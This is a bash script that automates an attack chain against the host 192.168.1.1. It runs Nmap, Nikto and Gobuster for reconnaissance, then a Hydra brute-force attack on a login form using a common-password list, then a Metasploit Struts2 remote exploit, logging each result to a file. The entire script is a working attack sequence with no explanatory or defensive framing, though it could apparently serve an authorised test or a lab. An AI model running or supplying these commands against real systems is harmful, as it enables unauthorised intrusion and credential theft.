#!/bin/bash

# Scan with Nmap
nmap -sV 192.168.1.1 -oN nmap_results.txt

# Run Nikto
nikto -h http://192.168.1.1 -o nikto_results.txt

# Directory brute force with Gobuster
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt

# Brute force attack with Hydra
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/top-1000.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" -o hydra_results.txt

# Exploit with Metasploit
msfconsole -q -x "use exploit/multi/http/struts2_content_type; set RHOST 192.168.1.1; run; exit;" > metasploit_results.txt
